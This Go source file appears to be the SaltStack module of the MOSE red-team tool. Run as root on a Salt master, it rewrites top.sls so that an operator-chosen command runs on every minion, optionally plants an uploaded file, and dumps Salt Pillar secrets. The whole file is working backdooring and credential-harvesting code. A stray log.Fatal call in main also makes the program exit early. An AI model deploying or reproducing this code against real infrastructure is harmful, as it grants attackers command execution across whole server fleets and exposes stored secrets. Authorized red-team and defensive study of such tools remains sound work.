// Copyright 2020 National Technology & Engineering Solutions of Sandia, LLC (NTESS).
// Under the terms of Contract DE-NA0003525 with NTESS,
// the U.S. Government retains certain rights in this software.

package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"text/template"

	"github.com/gobuffalo/packr/v2"
	utils "github.com/l50/goutils"
	"github.com/master-of-servers/mose/pkg/moseutils"
)

type command struct {
	Cmd       string
	FileName  string
	StateName string
}

var (
	a              = CreateAgent()
	cleanup        bool
	cleanupFile    = a.CleanupFile
	cmd            = a.Cmd
	debug          = a.Debug
	osTarget       = a.OsTarget
	saltStateName  = a.PayloadName
	uploadFileName = a.FileName
	uploadFilePath = a.RemoteUploadFilePath
	saltBackupLoc  = a.SaltBackupLoc
	specific       bool
)

func init() {
	flag.BoolVar(&cleanup, "c", false, "Activate cleanup using the file location in settings.json")
	flag.BoolVar(&specific, "s", false, "Specify which environments of the top.sls you would like to backdoor")
	flag.Parse()
}

//func getExistingTopFiles() []string {
func getTopFile() string {
	var topLoc string
	fileList, _ := moseutils.GetFileAndDirList([]string{"/srv"})
	for _, file := range fileList {
		if strings.Contains(file, "top.sls") && !strings.Contains(file, "~") &&
			!strings.Contains(file, ".bak") && !strings.Contains(file, "#") && !strings.Contains(file, "pillar") {
			topLoc = file
		}
	}
	if topLoc == "" {
		log.Fatalln("Unable to locate a top file to backdoor, exiting.")
	}
	return topLoc
}

func backdoorSiteSpecific(topLoc string) {
	lineReg := regexp.MustCompile(`(?sm)^(\s+)(\- [^\s]+)`)
	comments := regexp.MustCompile(`#.*`)

	fileContent, err := ioutil.ReadFile(topLoc)
	if err != nil {
		log.Println(err)
		log.Fatalf("Failed to backdoor the top.sls located at %s, exiting.", topLoc)
	}

	content := fmt.Sprint(comments.ReplaceAllString(string(fileContent), ""))

	newContent := ""
	log.Printf("Original contents: %s", content)
	for _, line := range strings.Split(content, "\n") {
		//fmt.Println(line)
		if line == "" {
			continue
		}
		ques := fmt.Sprintf("Would you like to drop payload below the following: \n%s", line)
		ans, err := moseutils.AskUserQuestion(ques, osTarget)
		if err != nil {
			log.Fatal("Quitting ...")
		}
		if ans {
			newContent += lineReg.ReplaceAllString(line, "$1$2\n$1- "+saltStateName)
		} else {
			newContent += line + "\n"
		}
		log.Printf("New contenet so far: \n%s", newContent)
	}
	newContent += "\n"

	err = ioutil.WriteFile(topLoc, []byte(newContent), 0644)
	if err != nil {
		log.Fatalf("Failed to backdoor the top.sls located at %s, exiting.", topLoc)
	}
}

func backdoorSite(topLoc string) {
	groupLastItem := regexp.MustCompile(`(?sm)( {4}-)([a-zA-Z-_ :\n\r]*)$`)
	comments := regexp.MustCompile(`#.*`)

	fileContent, err := ioutil.ReadFile(topLoc)
	if err != nil {
		log.Println(err)
		log.Fatalf("Failed to backdoor the top.sls located at %s, exiting.", topLoc)
	}

	content := fmt.Sprint(comments.ReplaceAllString(string(fileContent), ""))

	found := groupLastItem.MatchString(content)
	if found {
		insertState := "$1$2\n$1 " + saltStateName
		content = fmt.Sprint(groupLastItem.ReplaceAllString(content, insertState))
		err = ioutil.WriteFile(topLoc, []byte(content), 0644)
		if err != nil {
			log.Fatalf("Failed to backdoor the top.sls located at %s, exiting.", topLoc)
		}
		return
	}

	log.Fatalf("Failed to backdoor the top.sls located at %s, exiting.", topLoc)
}

func getTopLoc(topLoc string) string {
	d, _ := filepath.Split(topLoc)
	return d
}

func createState(topLoc string, cmd string) {
	topLocPath := getTopLoc(topLoc)
	stateFolderLoc := filepath.Join(topLocPath, saltStateName)
	stateFolders := []string{stateFolderLoc}

	stateFilePath := filepath.Join(topLocPath, saltStateName, saltStateName+".sls")

	if moseutils.CreateFolders(stateFolders) && generateState(stateFilePath, cmd, saltStateName) {
		moseutils.Msg("Successfully created the %s state at %s", saltStateName, stateFilePath)
		moseutils.Msg("Adding folder %s to cleanup file", stateFolderLoc)
		// Track the folders for clean up purposes
		moseutils.TrackChanges(cleanupFile, stateFolderLoc)
		if uploadFileName != "" {
			saltFileFolders := filepath.Join(stateFolderLoc, "files")

			moseutils.CreateFolders([]string{saltFileFolders})
			log.Printf("Copying  %s to module location %s", uploadFileName, saltFileFolders)
			moseutils.CpFile(uploadFileName, filepath.Join(saltFileFolders, filepath.Base(uploadFileName)))
			if err := os.Chmod(filepath.Join(saltFileFolders, filepath.Base(uploadFileName)), 0644); err != nil {
				log.Fatal(err)
			}
			log.Printf("Successfully copied and chmod file %s", filepath.Join(saltFileFolders, filepath.Base(uploadFileName)))
		}
	} else {
		log.Fatalf("Failed to create %s state", saltStateName)
	}
}

func generateState(stateFile string, cmd string, stateName string) bool {
	saltCommands := command{
		Cmd:       cmd,
		FileName:  uploadFileName,
		StateName: stateName,
	}

	box := packr.New("Salt", "../../../templates/salt")

	s, err := box.FindString("saltStateName.tmpl")
	if uploadFileName != "" {
		s, err = box.FindString("saltFileUploadState.tmpl")
	}

	if err != nil {
		log.Fatal("Parse: ", err)
	}

	t, err := template.New("saltStateName").Parse(s)

	if err != nil {
		log.Fatal("Parse: ", err)
	}

	f, err := os.Create(stateFile)

	if err != nil {
		log.Fatalln(err)
	}

	err = t.Execute(f, saltCommands)

	if err != nil {
		log.Fatal("Execute: ", err)
	}

	f.Close()

	return true
}

func getPillarSecrets(binLoc string) {
	//Running command salt '*' pillar.items
	res, err := utils.RunCommand(binLoc, "*", "pillar.items")
	if err != nil {
		log.Printf("Error running command: %s '*' pillar.items", binLoc)
		log.Fatal(err)
	}
	moseutils.Msg("%s", res)

	return
}

func doCleanup(siteLoc string) {
	moseutils.TrackChanges(cleanupFile, cleanupFile)
	ans, err := moseutils.AskUserQuestion("Would you like to remove all files associated with a previous run?", osTarget)
	if err != nil {
		log.Fatal("Quitting...")
	}
	moseutils.RemoveTracker(cleanupFile, osTarget, ans)

	path := siteLoc
	if saltBackupLoc != "" {
		path = filepath.Join(saltBackupLoc, filepath.Base(siteLoc))
	}

	path = path + ".bak.mose"

	if !moseutils.FileExists(path) {
		log.Printf("Backup file %s does not exist, skipping", path)
	}
	ans2 := false
	if !ans {
		ans2, err = moseutils.AskUserQuestion(fmt.Sprintf("Overwrite %s with %s", siteLoc, path), osTarget)
		if err != nil {
			log.Fatal("Quitting...")
		}
	}
	if ans || ans2 {
		moseutils.CpFile(path, siteLoc)
		os.Remove(path)
	}
	os.Exit(0)
}

func backupSite(siteLoc string) {
	path := siteLoc
	if saltBackupLoc != "" {
		path = filepath.Join(saltBackupLoc, filepath.Base(siteLoc))
	}
	if !moseutils.FileExists(path + ".bak.mose") {
		moseutils.CpFile(siteLoc, path+".bak.mose")
		return
	}
	log.Printf("Backup of the top.sls (%v.bak.mose) already exists.", siteLoc)
	return
}

func main() {
	// If we're not root, we probably can't backdoor any of the salt code, so exit
	utils.CheckRoot()
	// Get the existing top.sls file
	topLoc := getTopFile()
	log.Fatal(topLoc)

	if cleanup {
		doCleanup(topLoc)
	}

	if uploadFilePath != "" {
		moseutils.TrackChanges(cleanupFile, uploadFilePath)
	}

	found, binLoc := moseutils.FindFile("salt", []string{"/bin", "/home", "/opt", "/root", "/usr/bin"})
	if !found {
		log.Fatalf("salt binary not found, exiting...")
	}
	//found, topLoc := moseutils.FindFile("top.sls", []string{"/srv/salt"})
	if !found {
		log.Fatalf("top.sls not found, exiting...")
	}

	if cleanup {
		doCleanup(topLoc)
	}

	backupSite(topLoc)
	moseutils.Msg("Backdooring the %s top.sls to run %s on all minions, please wait...", topLoc, cmd)
	if specific {
		backdoorSiteSpecific(topLoc)
	}
	backdoorSite(topLoc)
	createState(topLoc, cmd)

	log.Println("Attempting to find secrets stored with salt Pillars")
	getPillarSecrets(strings.TrimSpace(binLoc))
}
